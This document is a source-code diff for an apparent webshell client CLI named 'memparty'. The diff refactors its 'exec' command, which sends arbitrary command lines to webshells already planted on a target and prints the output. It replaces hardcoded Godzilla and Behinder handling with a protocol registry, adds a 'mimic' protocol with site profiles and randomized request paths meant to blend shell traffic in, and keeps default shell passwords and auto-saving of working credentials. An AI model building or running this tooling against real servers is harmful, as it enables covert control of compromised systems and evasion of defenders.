@@ -1,8 +1,12 @@
 import { Command, Option } from "commander";
 
 import { logInfo, reportError, type GlobalOptions } from "../cli-context.js";
-import { execBehinder } from "../connect/behinder.js";
-import { execGodzilla, type GodzillaExecOptions } from "../connect/godzilla.js";
+import {
+  protocolNames,
+  requireProtocol,
+  unsupportedMessage,
+  type ProtocolOptions,
+} from "../connect/registry.js";
 import type { CommonConnectOptions, ExecResult } from "../connect/types.js";
 import { logOp, truncateOutput } from "../core/oplog.js";
 import { autoSaveShell, resolveConnection } from "../core/targets.js";
@@ -17,6 +21,8 @@ interface ExecCmdOptions extends GlobalOptions {
   headerName?: string;
   headerValue?: string;
   header?: string[];
+  profile?: string;
+  dynamicPath?: boolean;
   insecure?: boolean;
   json?: boolean;
   save?: boolean;
@@ -38,16 +44,16 @@ export function registerExecCommand(program: Command): void {
   program
     .command("exec")
     .description(
-      "Execute a command on a deployed webshell (Godzilla / Behinder) and print its output",
+      "Execute a command on a deployed webshell and print its output",
     )
     .argument("[name]", "saved target name (see 'memparty list')")
     .option("-u, --url <url>", "URL of the deployed shell (or give a saved target name)")
     .addOption(
-      new Option("-t, --tool <tool>", "shell tool").choices(["godzilla", "behinder"]),
+      new Option("-t, --tool <tool>", "shell protocol").choices(protocolNames("exec")),
     )
     .requiredOption("--cmd <command>", "command line to execute on the target")
     .option("--pass <pass>", "password (godzilla default: pass; behinder default: rebeyond)")
-    .option("--key <key>", "godzilla key", "key")
+    .option("--key <key>", "godzilla/mimic key (default: key)")
     .addOption(
       new Option("--os <family>", "godzilla: remote OS for the shell wrapper")
         .choices(["auto", "windows", "linux"])
@@ -62,6 +68,8 @@ export function registerExecCommand(program: Command): void {
       "gate header value reported by gen (shellToolConfig.headerValue)",
     )
     .option("-H, --header <line...>", 'extra request header, e.g. -H "Cookie: a=b"')
+    .option("--profile <name>", "mimic: site profile name (see 'memparty profile')")
+    .option("--dynamic-path", "mimic: randomize the request path from the site profile")
     .option("-k, --insecure", "skip TLS certificate verification")
     .option("--json", "output raw JSON")
     .option("--no-save", "do not auto-save the target after a successful exec")
@@ -97,6 +105,7 @@ the OS inside its payload, so --os does not apply.
           headerValue: opts.headerValue,
           extraHeaders: parseExtraHeaders(opts.header),
           insecure: opts.insecure,
+          profile: opts.profile,
         });
       } catch (err) {
         reportError(err instanceof Error ? err.message : String(err), opts.json ? ["--json"] : []);
@@ -113,27 +122,23 @@ the OS inside its payload, so --os does not apply.
       };
 
       let result: ExecResult;
-      switch (conn.tool) {
-        case "godzilla": {
-          const gdzOpts: GodzillaExecOptions = { ...common, os: opts.os };
-          result = await execGodzilla(
-            conn.url,
-            conn.pass ?? "pass",
-            conn.key ?? "key",
-            opts.cmd!,
-            gdzOpts,
-          );
-          break;
-        }
-        case "behinder":
-          result = await execBehinder(conn.url, conn.pass ?? "rebeyond", opts.cmd!, common);
-          break;
-        default:
-          process.stderr.write(
-            `Error: exec supports godzilla | behinder (got ${String(conn.tool)})\n`,
-          );
+      try {
+        const protocol = requireProtocol(conn.tool);
+        if (!protocol.exec) {
+          reportError(unsupportedMessage(protocol, "exec"), opts.json ? ["--json"] : []);
           process.exitCode = 1;
           return;
+        }
+        const options: ProtocolOptions = {
+          os: opts.os,
+          profile: conn.profile,
+          dynamicPath: opts.dynamicPath,
+        };
+        result = await protocol.exec({ conn, common, options }, opts.cmd!);
+      } catch (err) {
+        reportError(err instanceof Error ? err.message : String(err), opts.json ? ["--json"] : []);
+        process.exitCode = 1;
+        return;
       }
 
       // a successful exec proves the credentials — keep them as a named target
